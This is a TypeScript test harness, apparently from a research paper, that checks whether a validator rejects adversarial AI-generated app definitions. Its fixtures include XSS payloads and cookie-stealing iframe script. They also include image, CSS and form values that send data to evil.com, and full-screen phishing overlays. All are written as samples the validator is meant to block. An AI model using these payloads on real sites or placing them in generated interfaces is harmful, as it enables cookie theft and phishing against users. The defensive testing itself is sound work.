import { AppDefinition, EvaluationResult, EvaluationSuiteReport, PipelineDefinition, ViewNode } from '../types';
import { verifyProposal } from './validator';
import { verifyLensLaws } from './migration';
import { WasmKernel } from '../services/WasmKernel';
import { MAX_TREE_DEPTH } from '../constants';

/**
 * APPENDIX A: Test Harness Controller
 * 
 * This module implements the "Test Controller" and "Scenario Generator" 
 * described in the paper. It executes the Adversarial Prompt Suite (Section 4.1)
 * and Liveness Stress Tests (Section 4.2).
 */

// Helper to create a deep nested structure that exceeds limits
function createDeepNest(depth: number): ViewNode {
    if (depth === 0) return { id: 'leaf', type: 'text' };
    return {
        id: `node_${depth}`,
        type: 'container',
        children: [createDeepNest(depth - 1)]
    };
}

// ============================================================================
// GOLDEN PATH TEST FIXTURES (Valid Pipelines)
// ============================================================================

const TEXT_PIPELINE: PipelineDefinition = {
    inputs: { text: 'string' },
    nodes: [
        { id: 'n1', op: 'Text.ToUpper', inputs: { '0': '$text' } },
        { id: 'n2', op: 'Text.Length', inputs: { '0': '@n1' } }
    ],
    output: 'n2'
};

const MATH_PIPELINE: PipelineDefinition = {
    inputs: { a: 'number', b: 'number' },
    nodes: [
        { id: 'add', op: 'Math.Add', inputs: { '0': '$a', '1': '$b' } },
        { id: 'double', op: 'Math.Multiply', inputs: { '0': '@add', '1': 2 } }
    ],
    output: 'double'
};

const MIXED_PIPELINE: PipelineDefinition = {
    inputs: { items: 'any' },
    nodes: [
        { id: 'sort', op: 'List.Sort', inputs: { '0': '$items' } },
        { id: 'take', op: 'List.Take', inputs: { '0': '@sort', '1': 3 } },
        { id: 'join', op: 'Text.Join', inputs: { '0': '@take', '1': ', ' } }
    ],
    output: 'join'
};

const GOLDEN_PATH_APP: AppDefinition = {
    version: 'test-golden-v1',
    initialContext: {
        text: 'hello world',
        a: 5,
        b: 10,
        items: ['cherry', 'apple', 'banana']
    },
    machine: {
        initial: 'idle',
        states: {
            idle: {
                on: {
                    'RUN_TEXT': { actions: ['RUN:text_pipe:textResult'] },
                    'RUN_MATH': { actions: ['RUN:math_pipe:mathResult'] },
                    'RUN_MIXED': { actions: ['RUN:mixed_pipe:mixedResult'] }
                }
            }
        }
    },
    pipelines: {
        text_pipe: TEXT_PIPELINE,
        math_pipe: MATH_PIPELINE,
        mixed_pipe: MIXED_PIPELINE
    },
    view: {
        id: 'root',
        type: 'container',
        children: [
            { id: 'btn1', type: 'button', onClick: 'RUN_TEXT', props: { label: 'Run Text' } },
            { id: 'btn2', type: 'button', onClick: 'RUN_MATH', props: { label: 'Run Math' } },
            { id: 'btn3', type: 'button', onClick: 'RUN_MIXED', props: { label: 'Run Mixed' } }
        ]
    },
    testVectors: [
        {
            name: 'Text Pipeline Trigger',
            initialState: 'idle',
            steps: [{ event: 'RUN_TEXT', expectState: 'idle', expectContextKeys: ['textResult'] }]
        },
        {
            name: 'Math Pipeline Trigger',
            initialState: 'idle',
            steps: [{ event: 'RUN_MATH', expectState: 'idle', expectContextKeys: ['mathResult'] }]
        }
    ]
};

// ============================================================================
// ADVERSARIAL TEST FIXTURES (Invalid Proposals)
// ============================================================================

const ADVERSARIAL_SUITE: Record<string, Partial<AppDefinition>> = {
  // --- STRUCTURAL ATTACKS ---
  'Invalid Component Type': {
    view: { id: 'root', type: 'malware_button' as any }
  },
  'Infinite Recursion Structure': {
    view: createDeepNest(MAX_TREE_DEPTH + 10) // Exceeds max depth
  },
  
  // --- MACHINE LOGIC ATTACKS ---
  'Action/Event Conflation': {
    machine: {
      initial: 'idle',
      states: {
        idle: { on: { 'APPEND:data:list': 'idle' } } // Illegal: Action as Event
      }
    }
  },
  'Reset-Before-Use Hazard': {
    machine: {
      initial: 'idle',
      states: {
        idle: { 
            on: { 
                'SAVE': { actions: ['RESET:input', 'APPEND:input:list'] } // Logic Hazard
            } 
        }
      }
    }
  },
  
  // --- PIPELINE ATTACKS ---
  'Unknown Operator in Pipeline': {
    pipelines: {
      bad_pipe: {
        inputs: { x: 'string' },
        nodes: [{ id: 'n1', op: 'MALWARE.Execute' as any, inputs: { '0': '$x' } }],
        output: 'n1'
      }
    }
  },
  'Cyclic Pipeline': {
    pipelines: {
      cycle_pipe: {
        inputs: { x: 'number' },
        nodes: [
          { id: 'a', op: 'Math.Add', inputs: { '0': '@b', '1': 1 } },
          { id: 'b', op: 'Math.Add', inputs: { '0': '@a', '1': 1 } }
        ],
        output: 'a'
      }
    }
  },

  // --- XSS / INJECTION ATTACKS ---
  'XSS via dangerouslySetInnerHTML': {
    view: { 
      id: 'root', 
      type: 'container', 
      props: { dangerouslySetInnerHTML: { __html: '<script>alert("pwned")</script>' } } 
    }
  },
  'XSS via innerHTML prop': {
    view: { 
      id: 'root', 
      type: 'container', 
      props: { innerHTML: '<img src=x onerror=alert(1)>' } 
    }
  },
  'XSS via event handler string': {
    view: { 
      id: 'root', 
      type: 'button', 
      props: { onMouseEnter: 'javascript:alert(document.cookie)' } 
    }
  },
  'XSS via javascript: URL': {
    view: { 
      id: 'root', 
      type: 'element', 
      tag: 'a',
      props: { href: 'javascript:alert(1)' } 
    }
  },

  // --- OVERLAY / PHISHING ATTACKS ---
  'Overlay via style.position fixed': {
    view: { 
      id: 'root', 
      type: 'container', 
      props: { style: { position: 'fixed', top: 0, left: 0, width: '100vw', height: '100vh', zIndex: 9999 } } 
    }
  },
  'Overlay via Tailwind fixed class': {
    view: { 
      id: 'root', 
      type: 'container', 
      props: { className: 'fixed inset-0 z-50 bg-white' } 
    }
  },
  'Hidden exfiltration via opacity-0': {
    view: { 
      id: 'root', 
      type: 'container', 
      props: { className: 'opacity-0' },
      children: [{ id: 'hidden', type: 'element', tag: 'img', props: { src: 'http://evil.com/track?data=stolen' } }]
    }
  },
  'Hidden via style.visibility': {
    view: { 
      id: 'root', 
      type: 'container', 
      props: { style: { visibility: 'hidden' } } 
    }
  },

  // --- CSS INJECTION ATTACKS ---
  'CSS injection via Tailwind arbitrary value': {
    view: { 
      id: 'root', 
      type: 'container', 
      props: { className: 'bg-[url(http://evil.com/exfil?cookie=document.cookie)]' } 
    }
  },
  'CSS injection via arbitrary width': {
    view: { 
      id: 'root', 
      type: 'container', 
      props: { className: 'w-[calc(100vw-env(safe-area-inset-left))]' } 
    }
  },

  // --- DATA EXFILTRATION ATTACKS ---
  'Exfiltration via external image src': {
    view: { 
      id: 'root', 
      type: 'element', 
      tag: 'img',
      props: { src: 'https://evil.com/track.gif?data=sensitive' } 
    }
  },
  'Exfiltration via external href': {
    view: { 
      id: 'root', 
      type: 'element', 
      tag: 'a',
      props: { href: 'https://phishing.com/login' } 
    }
  },
  'Form hijacking via action prop': {
    view: { 
      id: 'root', 
      type: 'container', 
      props: { action: 'https://evil.com/steal' } 
    }
  },

  // --- IFRAME ATTACKS ---
  'Iframe XSS via srcdoc': {
    view: { 
      id: 'root', 
      type: 'element', 
      tag: 'div',
      props: { srcdoc: '<script>parent.postMessage(document.cookie, "*")</script>' } 
    }
  }
};

export class EvaluationHarness {
    
    // ========================================================================
    // SECTION 4.0: Golden Path Tests (Positive Pipeline Execution)
    // ========================================================================
    
    static async runGoldenPathTests(): Promise<EvaluationResult[]> {
        const results: EvaluationResult[] = [];
        const kernel = new WasmKernel();
        
        try {
            // First verify the golden path app passes validation
            const validationStart = performance.now();
            const report = await verifyProposal(GOLDEN_PATH_APP);
            
            results.push({
                category: 'CORRECTNESS',
                name: 'Golden App Validation',
                status: report.passed ? 'PASS' : 'FAIL',
                latencyMs: performance.now() - validationStart,
                details: report.passed ? 'All structural/semantic checks passed' : `Validation failed with score ${report.score}`
            });
            
            if (!report.passed) {
                return results; // Can't continue if validation fails
            }
            
            // Initialize kernel with golden path app
            await kernel.init(GOLDEN_PATH_APP.initialContext, GOLDEN_PATH_APP);
            
            // Test 1: Text Pipeline (ToUpper → Length)
            const textStart = performance.now();
            try {
                const textResult = await kernel.dispatch('RUN_TEXT', null, 'root');
                const output = textResult.context.textResult;
                // "HELLO WORLD" has length 11
                const passed = output === 11;
                results.push({
                    category: 'CORRECTNESS',
                    name: 'Golden Path: Text Pipeline',
                    status: passed ? 'PASS' : 'FAIL',
                    latencyMs: performance.now() - textStart,
                    details: passed ? `Correct: ToUpper→Length = ${output}` : `Expected 11, got ${output}`
                });
            } catch (e: any) {
                results.push({
                    category: 'CORRECTNESS',
                    name: 'Golden Path: Text Pipeline',
                    status: 'FAIL',
                    latencyMs: performance.now() - textStart,
                    details: `Execution error: ${e.message}`
                });
            }
            
            // Test 2: Math Pipeline (Add → Multiply)
            const mathStart = performance.now();
            try {
                const mathResult = await kernel.dispatch('RUN_MATH', null, 'root');
                const output = mathResult.context.mathResult;
                // (5 + 10) * 2 = 30
                const passed = output === 30;
                results.push({
                    category: 'CORRECTNESS',
                    name: 'Golden Path: Math Pipeline',
                    status: passed ? 'PASS' : 'FAIL',
                    latencyMs: performance.now() - mathStart,
                    details: passed ? `Correct: (5+10)*2 = ${output}` : `Expected 30, got ${output}`
                });
            } catch (e: any) {
                results.push({
                    category: 'CORRECTNESS',
                    name: 'Golden Path: Math Pipeline',
                    status: 'FAIL',
                    latencyMs: performance.now() - mathStart,
                    details: `Execution error: ${e.message}`
                });
            }
            
            // Test 3: Mixed Pipeline (Sort → Take → Join)
            const mixedStart = performance.now();
            try {
                const mixedResult = await kernel.dispatch('RUN_MIXED', null, 'root');
                const output = mixedResult.context.mixedResult;
                // ['cherry', 'apple', 'banana'] sorted = ['apple', 'banana', 'cherry'], take 3, join = "apple, banana, cherry"
                const expected = 'apple, banana, cherry';
                const passed = output === expected;
                results.push({
                    category: 'CORRECTNESS',
                    name: 'Golden Path: Mixed Pipeline',
                    status: passed ? 'PASS' : 'FAIL',
                    latencyMs: performance.now() - mixedStart,
                    details: passed ? `Correct: Sort→Take→Join = "${output}"` : `Expected "${expected}", got "${output}"`
                });
            } catch (e: any) {
                results.push({
                    category: 'CORRECTNESS',
                    name: 'Golden Path: Mixed Pipeline',
                    status: 'FAIL',
                    latencyMs: performance.now() - mixedStart,
                    details: `Execution error: ${e.message}`
                });
            }
            
        } catch (e: any) {
            results.push({
                category: 'CORRECTNESS',
                name: 'Golden Path: Kernel Init',
                status: 'FAIL',
                latencyMs: 0,
                details: `Failed to initialize: ${e.message}`
            });
        } finally {
            kernel.dispose();
        }
        
        return results;
    }
    
    // ========================================================================
    // SECTION 4.1: Safety Under Adversarial Generation
    // ========================================================================
    static async runSafetyTests(): Promise<EvaluationResult[]> {
        const results: EvaluationResult[] = [];
        
        for (const [name, partialDef] of Object.entries(ADVERSARIAL_SUITE)) {
            const start = performance.now();
            try {
                // Construct a malformed proposal
                const badProposal = {
                    version: 'test-v1',
                    initialContext: {},
                    machine: { initial: 'idle', states: { idle: {} } },
                    view: { id: 'root', type: 'container' },
                    ...partialDef
                } as AppDefinition;

                const report = await verifyProposal(badProposal);
                
                // WE EXPECT FAILURE (Rejection)
                const passed = !report.passed; // Invert logic: If validator failed (rejected), we PASS the safety test
                
                results.push({
                    category: 'SAFETY',
                    name: `Adversarial: ${name}`,
                    status: passed ? 'PASS' : 'FAIL',
                    latencyMs: performance.now() - start,
                    details: passed ? 'Correctly Rejected' : 'Safety Violation: Schema was accepted!'
                });
            } catch (e: any) {
                results.push({
                    category: 'SAFETY',
                    name: `Adversarial: ${name}`,
                    status: 'FAIL',
                    latencyMs: performance.now() - start,
                    details: `Harness Error: ${e.message}`
                });
            }
        }

        return results;
    }

    // SECTION 4.2: Liveness Under Unbounded Execution
    static async runLivenessTests(currentContext: Record<string, unknown>, currentDef: AppDefinition): Promise<EvaluationResult[]> {
        const results: EvaluationResult[] = [];
        const kernel = new WasmKernel();
        
        try {
            await kernel.init(currentContext, currentDef);
            const start = performance.now();
            
            // STRESS TEST: FORCE INFINITE LOOP
            // We deliberately try to hang the worker to prove the Fuel Limit works.
            try {
                await kernel.forceHang();
                // If it doesn't throw, that's bad!
                results.push({
                    category: 'LIVENESS',
                    name: 'Fuel Limit / Infinite Loop Protection',
                    status: 'FAIL',
                    latencyMs: performance.now() - start,
                    details: 'Vulnerability: Infinite loop was NOT terminated by Sandbox.'
                });
            } catch (e: any) {
                // We EXPECT an error here containing "GOVERNANCE"
                if (e.message.includes('GOVERNANCE')) {
                    results.push({
                        category: 'LIVENESS',
                        name: 'Fuel Limit / Infinite Loop Protection',
                        status: 'PASS',
                        latencyMs: performance.now() - start,
                        details: `Attack Neutralized: ${e.message}`
                    });
                } else {
                     results.push({
                        category: 'LIVENESS',
                        name: 'Fuel Limit / Infinite Loop Protection',
                        status: 'FAIL',
                        latencyMs: performance.now() - start,
                        details: `Unexpected Error: ${e.message}`
                    });
                }
            }

        } catch (e: any) {
             results.push({
                category: 'LIVENESS',
                name: 'Kernel Initialization',
                status: 'FAIL',
                latencyMs: 0,
                details: e.message || 'Worker init failed'
            });
        } finally {
            kernel.dispose();
        }

        return results;
    }

    // SECTION 4.3: Correctness of Schema Evolution
    static runCorrectnessTests(currentContext: any, currentDef: AppDefinition): EvaluationResult[] {
        const start = performance.now();
        const lensCheck = verifyLensLaws(currentContext, currentDef);
        
        return [{
            category: 'CORRECTNESS',
            name: 'Lens Law Compliance (Round-Trip)',
            status: lensCheck.satisfied ? 'PASS' : 'FAIL',
            latencyMs: performance.now() - start,
            details: lensCheck.satisfied ? 'Get/Put Laws Satisfied' : lensCheck.violation || 'Failed'
        }];
    }
}